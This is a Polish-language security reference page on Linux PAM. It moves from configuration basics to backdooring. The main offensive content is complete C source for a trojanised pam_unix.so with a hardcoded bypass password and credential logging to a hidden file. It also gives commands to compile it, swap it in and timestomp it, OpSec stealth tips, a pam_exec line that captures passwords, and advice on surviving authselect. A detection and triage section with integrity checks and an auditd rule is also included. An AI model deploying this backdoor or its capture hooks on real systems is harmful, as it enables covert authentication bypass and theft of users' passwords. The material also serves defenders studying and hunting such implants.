# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Podstawowe informacje

**PAM (Pluggable Authentication Modules)** działa jako mechanizm bezpieczeństwa, który **weryfikuje tożsamość użytkowników próbujących uzyskać dostęp do usług komputerowych**, kontrolując ich dostęp na podstawie różnych kryteriów. Przypomina cyfrowego strażnika, który zapewnia, że tylko autoryzowani użytkownicy mogą korzystać z określonych usług, jednocześnie potencjalnie ograniczając ich użycie, aby zapobiec przeciążeniu systemu.

#### Pliki konfiguracyjne

- **Solaris** obsługuje starszy centralny plik `/etc/pam.conf`, ale obecne wytyczne preferują pliki usług w katalogu `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Systemy Linux** preferują podejście oparte na katalogu, przechowując konfiguracje właściwe dla poszczególnych usług w `/etc/pam.d`. Na przykład plik konfiguracyjny usługi login znajduje się w `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Przykładowa konfiguracja PAM dla usługi login może wyglądać następująco:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Obszary zarządzania PAM**

Obszary te, czyli grupy zarządzania, obejmują **auth**, **account**, **password** i **session**, z których każdy odpowiada za inne aspekty procesu uwierzytelniania i zarządzania sesją:<sup>[[1]](#references)</sup>

- **Auth**: Weryfikuje tożsamość użytkownika, często prosząc o hasło.
- **Account**: Obsługuje weryfikację konta, sprawdzając warunki takie jak członkostwo w grupie lub ograniczenia zależne od pory dnia.
- **Password**: Zarządza aktualizacjami haseł, w tym sprawdzaniem złożoności i zapobieganiem dictionary attacks.
- **Session**: Zarządza działaniami podczas rozpoczynania lub kończenia sesji usługi, takimi jak montowanie katalogów lub ustawianie limitów zasobów.

#### **Kontrole modułów PAM**

Kontrole określają reakcję modułu na sukces lub niepowodzenie, wpływając na cały proces uwierzytelniania. Obejmują one:<sup>[[1]](#references)</sup>

- **Required**: Niepowodzenie wymaganego modułu skutkuje ostatecznym niepowodzeniem, ale dopiero po sprawdzeniu wszystkich kolejnych modułów.
- **Requisite**: Natychmiastowe zakończenie procesu w przypadku niepowodzenia.
- **Sufficient**: Jeśli żaden wcześniejszy moduł `required` nie zakończył się niepowodzeniem, sukces jest natychmiast zwracany, a pozostałe moduły w tej samej grupie zarządzania są pomijane.
- **Optional**: Powoduje niepowodzenie tylko wtedy, gdy jest jedynym modułem w stosie.

#### Semantyka ofensywna, która ma znaczenie

Podczas analizowania lub modyfikowania PAM **lokalizacja wstawionej reguły** określa, który stos ją obsługuje:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` i `substack` pobierają reguły z innych plików, więc edycja `sshd` może wpływać tylko na SSH, podczas gdy edycja `system-auth`, `common-auth` lub innego współdzielonego stosu wpływa jednocześnie na kilka usług.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM obsługuje również kontrole w nawiasach kwadratowych, takie jak `[success=1 default=ignore]`. Można je wykorzystać do **pomijania jednego lub większej liczby modułów** po pomyślnym przejściu niestandardowego sprawdzenia, zamiast jawnego zastępowania `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` może być **absolutna** (`/usr/lib/security/pam_custom.so`) lub **względna** względem domyślnego katalogu modułów PAM. We współczesnych systemach Linux rzeczywiste katalogi to często `/lib/security`, `/lib64/security`, `/usr/lib/security` lub ścieżki multiarch, takie jak `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Szybka wskazówka dla operatora: przed wprowadzeniem zmian zawsze zmapuj **pełny graf usług**. Na przykład `sshd -> password-auth -> system-auth` w niektórych dystrybucjach lub `sshd -> system-remote-login -> system-login -> system-auth` w innych oznacza, że ten sam jednolinijkowy implant może rozprzestrzenić się znacznie szerzej, niż zamierzano.<sup>[[1]](#references)[[13]](#references)</sup>

#### Przykładowy scenariusz

W konfiguracji z wieloma modułami auth proces przebiega w ściśle określonej kolejności. Jeśli moduł `pam_securetty` stwierdzi, że terminal logowania jest nieautoryzowany, logowania roota zostają zablokowane, jednak wszystkie moduły nadal są przetwarzane ze względu na status „required”. Moduł `pam_env` ustawia zmienne środowiskowe, co może poprawiać wygodę użytkownika. Moduły `pam_ldap` i `pam_unix` współpracują przy uwierzytelnianiu użytkownika, przy czym `pam_unix` próbuje użyć wcześniej podanego hasła, zwiększając wydajność i elastyczność metod uwierzytelniania.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Klasyczną techniką persistence w środowiskach Linux o wysokiej wartości jest **zamiana legalnej biblioteki PAM na trojanised drop-in**. Na hoście, którego stos PAM ładuje `pam_unix.so`, uwierzytelnianie przez SSH lub konsolę może wywołać punkt wejścia `pam_sm_authenticate()`; złośliwy zamiennik może przechwytywać dane uwierzytelniające lub implementować obejście uwierzytelniania za pomocą *magic* password.<sup>[[2]](#references)[[11]](#references)</sup>

### Ściąga kompilacji
Poniższy szkic wykorzystuje punkt wejścia usługi `pam_sm_authenticate()` Linux-PAM oraz `pam_get_authtok()` do uzyskania tokenu uwierzytelniania.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Przykładowy trojan `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Skompiluj i wykonaj stealth-replace (wzorzec replacement/timestomp jest udokumentowany przez Unit 42). Dostosuj zarówno ścieżkę kopii zapasowej zakodowaną na stałe w wrapperze, jak i poniższe polecenia do rzeczywistego katalogu modułów PAM na celu:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Wskazówki OpSec
1. **Atomic overwrite** – zapisz kompletną bibliotekę do pliku tymczasowego, a następnie zmień jego nazwę na docelową, aby uniknąć pozostawienia częściowo zapisanego modułu uwierzytelniania.
2. Ścieżkę taką jak `/usr/bin/.dbus.log` zaobserwowano podczas analizy AuthDoor przeprowadzonej przez Unit 42, dlatego jest ona również użytecznym wskaźnikiem do huntingu.<sup>[[2]](#references)</sup>
3. Zachowaj punkty wejścia oczekiwane przez stos PAM (na przykład `pam_sm_authenticate` i `pam_sm_setcred`), aby inne operacje zarządzania nadal działały.<sup>[[11]](#references)[[18]](#references)</sup>

### Wykrywanie
W przypadku kontroli integralności pakietów RPM weryfikuje metadane zainstalowanych plików, `debsums -s` zgłasza błędy sum kontrolnych, a `dpkg -S` w bloku triage sprawdza właściciela pakietu; składnia audit watch rejestruje zapisy i zmiany atrybutów ścieżki.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Porównaj MD5/SHA256 `pam_unix.so` z pakietem dystrybucji.
* Użyj `rpm -V pam` lub `debsums -s libpam-modules`, aby wykryć podmienione biblioteki bez ręcznego obliczania hashy.
* Sprawdź, czy w `/lib/security/` nie ma plików z prawem zapisu dla wszystkich użytkowników lub nietypowym właścicielem.
* Reguła `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Przeszukaj konfiguracje PAM pod kątem nieoczekiwanych modułów: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Szybkie polecenia triage (po przejęciu lub podczas threat huntingu)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Wykorzystywanie `pam_exec` do persistence
Zamiast zastępować `pam_unix.so`, mniej inwazyjnym podejściem jest dodanie wiersza `pam_exec` w `/etc/pam.d/sshd`, dzięki czemu wywołanie docierające do tego wiersza PAM uruchamia helpera, pozostawiając normalny stos bez zmian.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` otrzymuje metadane PAM w zmiennych środowiskowych, takich jak `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Przy użyciu `expose_authtok` helper może odczytać ze `stdin` do `PAM_MAX_RESP_SIZE` bajtów hasła podczas faz `auth` lub `password`. Jeśli chcesz, aby helper działał z efektywnym UID zamiast rzeczywistego UID, dodaj `seteuid`.<sup>[[4]](#references)</sup>

Poniżej znajdują się praktyczne uwagi dotyczące typów modułów oraz filtra `type=` udokumentowanych dla `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` jest lepszym wyborem dla **działań po zalogowaniu**, takich jak ponowne otwieranie socketów lub uruchamianie odłączonego daemona.
- `auth optional pam_exec.so quiet expose_authtok ...` jest typowym wyborem do **credential capture**, ponieważ działa przed otwarciem sesji.
- `type=session` lub `type=auth` można użyć do ograniczenia wykonywania do konkretnej fazy PAM i uniknięcia uciążliwego podwójnego wykonania.

### Przetrwanie działania narzędzi dystrybucji: `authselect`

W systemach RHEL i z rodziny Fedora korzystających z `authselect` bezpośrednie edycje generowanych plików, takich jak `/etc/pam.d/system-auth` lub `/etc/pam.d/password-auth`, mogą zostać **nadpisane przez `authselect`**. Aby zapewnić trwałość zmian, operatorzy często modyfikują aktywny custom profile w `/etc/authselect/custom/<profile>/`, a następnie wybierają go ponownie.<sup>[[5]](#references)[[19]](#references)</sup>

Typowy workflow, gdy masz root:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Ma to znaczenie zarówno dla ofensywy, jak i triage: jeśli `/etc/pam.d/system-auth` zawiera banner `Generated by authselect` oraz `Do not modify this file manually`, rzeczywisty punkt persistence może znajdować się w `/etc/authselect/custom/`, a nie w `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Najnowsze tradecraft zaobserwowane w praktyce

Najnowsze raporty z 2025 roku dotyczące backdoora **Plague** dla Linuxa pokazały rozwinięcie tej samej podstawowej idei: złośliwy komponent PAM ze **statycznym hasłem obejścia**, a także czyszczenie zmiennych środowiskowych związanych z SSH i historii powłoki (`HISTFILE=/dev/null)` w celu ograniczenia śladów sesji po zalogowaniu.<sup>[[3]](#references)</sup> Jest to użyteczny pattern podczas threat huntingu, ponieważ logika backdoora może znajdować się w PAM, podczas gdy artefakty stealth pojawiają się dopiero **po pomyślnym uwierzytelnieniu**.


## References

- [1] [pam.conf(5) / pam.d(5) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Podręcznik covert operatora: Infiltracja globalnych sieci telekomunikacyjnych - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: nowo odkryty backdoor oparty na PAM dla Linuxa](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigurowanie uwierzytelniania użytkowników za pomocą authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Podręcznik Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Zarządzanie uwierzytelnianiem w Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Przewodnik uwierzytelniania na poziomie systemu - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Lista plików pakietu Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Zmiany/uczynienie Authselect obowiązkowym - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
